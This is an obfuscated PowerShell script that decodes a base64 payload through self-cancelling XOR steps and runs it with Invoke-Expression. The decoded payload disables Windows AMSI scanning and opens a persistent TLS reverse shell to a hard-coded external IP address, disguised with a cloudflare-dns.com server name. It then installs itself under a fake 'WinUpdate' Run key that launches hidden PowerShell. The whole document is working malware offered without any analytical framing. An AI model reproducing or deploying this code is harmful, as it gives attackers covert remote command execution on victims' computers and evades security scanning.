function R1 { Get-Random -Minimum 1 -Maximum 101 }
function R2 {
    param([byte[]]$x, [byte[]]$y)
    $z = New-Object byte[] $x.Length
    for ($i = 0; $i -lt $x.Length; $i++) {
        $z[$i] = $x[$i] -bxor $y[$i % $y.Length]
    }
    return $z
}
$zutat = "JFA2WVJLOEV0MDlRSUs9JG51bGw7JGtqZj1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoKDkwNzYrODYzMS04NjMxKSk7JGFtcnp3cWxxb2V1YmtucG1td3pwZD0iK1tDaGFSXSgxMTkqMTAwLzEwMCkrW2NIQXJdKFtCeVRFXTB4NjgpK1tjSEFSXShbQnlURV0weDYzKStbQ2hhUl0oW0JZdEVdMHg3MCkrW0NoYXJdKFtCWXRFXTB4NzEpK1tjaGFyXSgxMTcpK1tDaGFyXShbYll0RV0weDc1KSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCgyNTYpO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoIlN5c3RlbS4kKFtDaGFSXSg3NysyLTIpK1tjaEFyXSg5NykrW2NIYXJdKDExMCkrW2NIQVJdKFtCeXRlXTB4NjEpK1tjSGFSXSgxMDMpK1tDSEFyXSgxMDErNzgtNzgpK1tDSEFSXSgxMDkqNzkvNzkpK1tDaGFyXSgxMDEqOC84KStbQ2hhcl0oW2JZVGVdMHg2ZSkrW2NoYVJdKDExNikpLiQoW2NoQXJdKFtCWVRFXTB4NDEpK1tjaEFyXSgyMCs5NykrW2NIYXJdKDExNioxOS8xOSkrW2NIQVJdKFtiWVRFXTB4NmYpK1tDSGFSXShbYll0ZV0weDZkKStbQ0hBcl0oOTcqNjMvNjMpK1tDaGFyXSgxMTYqNTIvNTIpK1tDaEFyXSgxMDUpK1tDaEFSXSgxMTErMjEtMjEpK1tjaGFSXShbYnlURV0weDZlKSkuJCgoJ8OEbXMnKyfDrsOZdCcrJ8OubHMnKS5uT1JtQWxpWmUoW0NoQVJdKFtieXRlXTB4NDYpK1tjSEFyXShbQllURV0weDZmKStbQ2hBcl0oMTE0KjIyLzIyKStbY0hhcl0oMTA5KStbY2hhUl0oW0JZdEVdMHg0NCkpIC1yZXBsYWNlIFtDaGFSXSg5Mis2My02MykrW0NIQVJdKDEwNSs3KStbY2hhUl0oMTIzKzI3LTI3KStbY0hhcl0oNzcrNTYtNTYpK1tjSGFyXShbYnlUZV0weDZlKStbY0hhUl0oW2JZdGVdMHg3ZCkpIikuR2V0RmllbGQoIiQoKCfDoG1zw65Tw6lzJysnc8Osw7RuJykubk9ybUFsSVplKFtjaGFSXShbQllUZV0weDQ2KStbQ2hBUl0oMTExKzYtNikrW2NIQXJdKDg3KzI3KStbY2hhUl0oW2J5VEVdMHg2ZCkrW2NIQXJdKDI3KzQxKSkgLXJlcGxhY2UgW0NIQXJdKDI0KzY4KStbQ0hBUl0oW0J5VEVdMHg3MCkrW0NoQXJdKFtieXRlXTB4N2IpK1tDaEFSXSg3Nys1MS01MSkrW2NIYVJdKDExMCs0MC00MCkrW0NIYXJdKDEyNSsxMTktMTE5KSkiLCAiTm9uUHVibGljLFN0YXRpYyIpLlNldFZhbHVlKCRQNllSSzhFdDA5UUlLLCAkUDZZUks4RXQwOVFJSyk7W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiU3lzdGVtLiQoW0NoYVJdKDc3KzItMikrW2NoQXJdKDk3KStbY0hhcl0oMTEwKStbY0hBUl0oW0J5dGVdMHg2MSkrW2NIYVJdKDEwMykrW0NIQXJdKDEwMSs3OC03OCkrW0NIQVJdKDEwOSo3OS83OSkrW0NoYXJdKDEwMSo4LzgpK1tDaGFyXShbYllUZV0weDZlKStbY2hhUl0oMTE2KSkuJChbY2hBcl0oW0JZVEVdMHg0MSkrW2NoQXJdKDIwKzk3KStbY0hhcl0oMTE2KjE5LzE5KStbY0hBUl0oW2JZVEVdMHg2ZikrW0NIYVJdKFtiWXRlXTB4NmQpK1tDSEFyXSg5Nyo2My82MykrW0NoYXJdKDExNio1Mi81MikrW0NoQXJdKDEwNSkrW0NoQVJdKDExMSsyMS0yMSkrW2NoYVJdKFtieVRFXTB4NmUpKS4kKCgnw4RtcycrJ8Ouw5l0Jysnw65scycpLm5PUm1BbGlaZShbQ2hBUl0oW2J5dGVdMHg0NikrW2NIQXJdKFtCWVRFXTB4NmYpK1tDaEFyXSgxMTQqMjIvMjIpK1tjSGFyXSgxMDkpK1tjaGFSXShbQll0RV0weDQ0KSkgLXJlcGxhY2UgW0NoYVJdKDkyKzYzLTYzKStbQ0hBUl0oMTA1KzcpK1tjaGFSXSgxMjMrMjctMjcpK1tjSGFyXSg3Nys1Ni01NikrW2NIYXJdKFtieVRlXTB4NmUpK1tjSGFSXShbYll0ZV0weDdkKSkiKS5HZXRGaWVsZCgiJChbY2hBUl0oOTcrNjItNjIpK1tjSEFyXSgxMDkrODMtODMpK1tDaGFSXShbYll0ZV0weDczKStbY0hhcl0oMTA1KjcwLzcwKStbY0hBUl0oW2J5VEVdMHg0MykrW2NIQXJdKDExMSkrW2NIYVJdKDExMCszMi0zMikrW0NoQXJdKDExNikrW0NIQXJdKFtieVRFXTB4NjUpK1tDaGFyXShbQllURV0weDc4KStbQ0hhUl0oMTE2KzkxLTkxKSkiLCAiTm9uUHVibGljLFN0YXRpYyIpLlNldFZhbHVlKCRQNllSSzhFdDA5UUlLLCBbSW50UHRyXSRramYpOyRpeWp4dHpwbHhobXdyanZhcT0iKygnd2p6enDDtGLDo3LDrMOkdicrJ3TDpCcpLm5PUm1BbEl6ZShbY0hhcl0oW0JZdEVdMHg0NikrW0NoYXJdKFtieVRFXTB4NmYpK1tjaEFSXSgxMTQrOTAtOTApK1tjaEFSXShbQllURV0weDZkKStbQ2hBcl0oNjgrNDEtNDEpKSAtcmVwbGFjZSBbQ2hBUl0oW0JZVEVdMHg1YykrW0NIYXJdKFtiWXRFXTB4NzApK1tjaGFSXShbYnlUZV0weDdiKStbQ0hBcl0oW0JZdEVdMHg0ZCkrW2NIYXJdKFtCeXRlXTB4NmUpK1tjSGFyXSgxMjUrNDMtNDMpIjtbVGhyZWFkaW5nLlRocmVhZF06OlNsZWVwKDMyKQpmdW5jdGlvbiBEZWNvZGUtQmFzZTY0U3RyaW5nKCRiKXtbVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYikpfQokV2pmSXdKNDIwNDIwNjk2OT1EZWNvZGUtQmFzZTY0U3RyaW5nICJPRGt1TVRJdU1qQTNMakl6TkE9PSIKJFd1cnN0U2FuZHdpY2g0MjA9W2ludF0oRGVjb2RlLUJhc2U2NFN0cmluZyAiT0RBNE1BPT0iKQokc3NsUHJvdG89W1N5c3RlbS5TZWN1cml0eS5BdXRoZW50aWNhdGlvbi5Tc2xQcm90b2NvbHNdOjpUbHMxMgoKZnVuY3Rpb24gV3JpdGUtU3RyZWFtKCRzdywkdHh0KXskc3cuV3JpdGUoJHR4dCArICdTSEVMTD4gJyk7JHN3LkZsdXNoKCl9Cgp3aGlsZSgkdHJ1ZSl7CiAgICB0cnl7CiAgICAgICAgJGNsaT1OZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudAogICAgICAgICRjbGkuQ29ubmVjdCgkV2pmSXdKNDIwNDIwNjk2OSwkV3Vyc3RTYW5kd2ljaDQyMCkKICAgICAgICAkbmV0U3RyZWFtPSRjbGkuR2V0U3RyZWFtKCkKICAgICAgICAkc3NsPU5ldy1PYmplY3QgTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkbmV0U3RyZWFtLCRmYWxzZSwoeyR0cnVlfSAtYXMgW05ldC5TZWN1cml0eS5SZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFja10pKQogICAgICAgICRzc2wuQXV0aGVudGljYXRlQXNDbGllbnQoJ2Nsb3VkZmxhcmUtZG5zLmNvbScsJG51bGwsJHNzbFByb3RvLCRmYWxzZSkKICAgICAgICBpZigtbm90ICgkc3NsLklzRW5jcnlwdGVkIC1hbmQgJHNzbC5Jc1NpZ25lZCkpeyAkc3NsLkNsb3NlKCk7JGNsaS5DbG9zZSgpO1N0YXJ0LVNsZWVwIDU7Y29udGludWUgfQoKICAgICAgICAkc3c9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHNzbCkKICAgICAgICAkc3cuQXV0b0ZsdXNoPSR0cnVlCiAgICAgICAgV3JpdGUtU3RyZWFtICRzdyAnJwoKICAgICAgICAkYnVmPU5ldy1PYmplY3QgQnl0ZVtdIDQwOTYKICAgICAgICB3aGlsZSgkdHJ1ZSl7CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgICRyPSRzc2wuUmVhZCgkYnVmLDAsJGJ1Zi5MZW5ndGgpCiAgICAgICAgICAgICAgICBpZigkciAtbGUgMCl7dGhyb3cgIngifQogICAgICAgICAgICAgICAgJGNtZD0oW1RleHQuRW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJGJ1ZiwwLCRyKS5UcmltKCkKICAgICAgICAgICAgICAgIGlmKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRjbWQpKXtXcml0ZS1TdHJlYW0gJHN3ICcnO2NvbnRpbnVlfQoKICAgICAgICAgICAgICAgICMgU2NodXR6IHZvciBkaXJla3RlbSBJRVggbWl0IHdoaXRlbGlzdCAoa2VpbiBhdXRvbWF0aXNjaGVzIEF1c2bDvGhyZW4pCiAgICAgICAgICAgICAgICBpZigkY21kIC1tYXRjaCAnXlxzKmlleFxzKycpewogICAgICAgICAgICAgICAgICAgICRvdXQ9Ikludm9rZS1FeHByZXNzaW9uIGlzdCBkZWFrdGl2aWVydC4iCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHRyeXskb3V0PUludm9rZS1FeHByZXNzaW9uICRjbWQgMj4mMSB8IE91dC1TdHJpbmd9Y2F0Y2h7JG91dD0kXy5FeGNlcHRpb24uTWVzc2FnZX0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVN0cmVhbSAkc3cgJG91dAogICAgICAgICAgICB9Y2F0Y2h7YnJlYWt9CiAgICAgICAgfQoKICAgICAgICAkc3cuQ2xvc2UoKQogICAgICAgICRzc2wuQ2xvc2UoKQogICAgICAgICRuZXRTdHJlYW0uQ2xvc2UoKQogICAgICAgICRjbGkuQ2xvc2UoKQogICAgfWNhdGNoe30KICAgIFN0YXJ0LVNsZWVwIDUKfQokMSA9ICIkZW52OlRFTVBcMS5wczEiCiQyID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1x1cGRhdGUucHMxIgokMyA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiQ0ID0gIldpblVwZGF0ZSIKCmlmICgtTm90IChUZXN0LVBhdGggJDEpKSB7CiAgICBXcml0ZS1FcnJvciAiUGF5bG9hZCBuaWNodCBnZWZ1bmRlbiB1bnRlcjogJDEiCiAgICBleGl0Cn0KCmlmICgtTm90IChUZXN0LVBhdGggJDIpKSB7CiAgICBDb3B5LUl0ZW0gLVBhdGggJDEgLURlc3RpbmF0aW9uICQyIC1Gb3JjZQp9CgokNSA9ICJwb3dlcnNoZWxsLmV4ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIGAiJDJgIiIKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkMyAtTmFtZSAkNCAtVmFsdWUgJDU="

$s1 = $zutat.Substring(0, 4)
$s2 = $zutat.Substring(4, 5)
$s3 = $zutat.Substring(9, 4)
$s4 = $zutat.Substring(13, 6)
$s5 = $zutat.Substring(19, 3)
$s6 = $zutat.Substring(22, 5)
$s7 = $zutat.Substring(27)

$gekocht = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7

$b = [Text.Encoding]::UTF8.GetBytes($gekocht)
$c = [string][math]::Round([math]::Pow((R1),10))
$d = [Text.Encoding]::UTF8.GetBytes($c)
$e = $d[($d.Length-1)..0]

$f1 = R2 -x $b -y $d
$f2 = R2 -x $f1 -y $e
$g = [Text.Encoding]::UTF8.GetString($f2)

$h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
$i = R2 -x $h -y $d
$j = [Text.Encoding]::UTF8.GetString($i)
$k = [Convert]::FromBase64String($j)
$l = [Text.Encoding]::UTF8.GetString($k)

Invoke-Expression $l
